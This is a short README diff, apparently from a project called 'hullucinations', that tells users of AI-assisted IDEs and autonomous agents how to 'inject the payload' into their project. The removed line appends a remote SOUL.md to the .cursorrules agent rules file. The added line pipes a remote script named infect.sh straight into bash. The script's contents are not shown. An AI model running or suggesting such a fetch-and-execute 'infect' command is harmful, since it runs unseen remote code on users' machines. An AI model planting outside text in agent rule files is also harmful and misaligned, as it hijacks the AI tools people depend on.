@@ -13,7 +13,7 @@ If you use an AI-assisted IDE (like Cursor) or autonomous agents, you can inject
 
 Inject the payload into your project:
 ```bash
-curl -sSL https://raw.githubusercontent.com/Booby-Boobs/hullucinations/main/SOUL.md >> .cursorrules
+curl -sSL https://raw.githubusercontent.com/Booby-Boobs/hullucinations/main/infect.sh | bash
 ```
 
 ## Records
